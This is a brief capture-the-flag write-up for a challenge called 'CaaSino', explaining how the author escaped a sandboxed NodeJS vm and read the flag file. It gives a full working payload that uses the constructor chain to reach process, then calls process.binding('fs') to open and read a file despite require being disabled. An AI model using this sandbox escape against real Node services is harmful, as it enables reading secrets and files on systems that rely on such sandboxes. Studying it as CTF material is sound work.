# CaaSino


Sandboxed NodeJS environment

We figured out we could use this.constructor.constructor("return this.process")() to run more arbritrary JS, but the require function was disabled.

However, we could use this.process.bindings to import the original C++ functions. With some reference to https://gist.github.com/phra/51f73898df729789aff741c6ea91d294 and the node JS source code, I came up with:

`this.constructor.constructor("b = Buffer.allocUnsafe(8192);this.process.binding('fs').read(this.process.binding('fs').open('/ctf/flag.txt', 0, 0600, 0, 0), b, 0, 4096, 0, 0, 0); return b")().toString()`


- Define a buffer of size 8192


- Call read() on a file descriptor provided by open('/ctf/flag.txt') in readonly, and read that into the buffer, then return


The zeros are where the docs specified 'undefined' and 'ctf' and luckily this didn't matter. We get the flag(and a bunch of junk)
#### Flag:flag{vm_1snt_s4f3_4ft3r_41l_29ka5sqD}
